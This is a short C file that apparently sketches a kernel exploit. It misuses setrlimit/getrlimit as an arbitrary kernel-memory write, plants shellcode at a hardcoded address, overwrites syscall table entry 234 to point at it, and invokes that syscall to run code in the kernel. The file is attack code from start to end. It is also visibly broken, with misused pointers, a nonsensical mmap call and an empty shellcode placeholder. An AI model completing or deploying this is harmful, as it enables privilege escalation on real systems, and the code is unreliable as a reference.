#include "generic.h"
#define RLIMIT_CORE 4

void writeToKernel(unsigned char *addr, unsigned char *buffer, size_t len)
{
    struct rlimit *rlp;
    getrlimit(RLIMIT_CORE, &rlp);
    while (len > 7) {
    memcpy(&rlp, buffer, 7);
    setrlimit(RLIMIT_CORE, &rlp);
    getrlimit(RLIMIT_CORE, addr);
    len -= 7; buffer += 7; addr += 7;
 }
    memcpy(&rlp, buffer, len);
    setrlimit(RLIMIT_CORE, &rlp);
    getrlimit(RLIMIT_CORE, addr);
}

void trigger(void) {
    struct ssrd *scentry;
    unsigned char *syscall1 = 0x38336a8c + 234 * sizeof(scentry);
    unsigned char *slackspace = 0x38336a8c;
    scentry.sy_call = slackspace + 1;
    scentry.sy_return_type = 1;

    writeToKernel(slackspace, &shellcode, sizeof(shellcode));
    writeToKernel(syscall1, &scentry, sizeof(scentry));
    syscall(234);
    mmap(PROT_READ | PROT_EXEC | PROT_WRITE | MAP_SHARED, syscall1, slackspace -1);



}
extern char *shellcode = ""; // Need to do some other stuff to get the shellcode
int main()
{
    trigger();
    return 0;

}
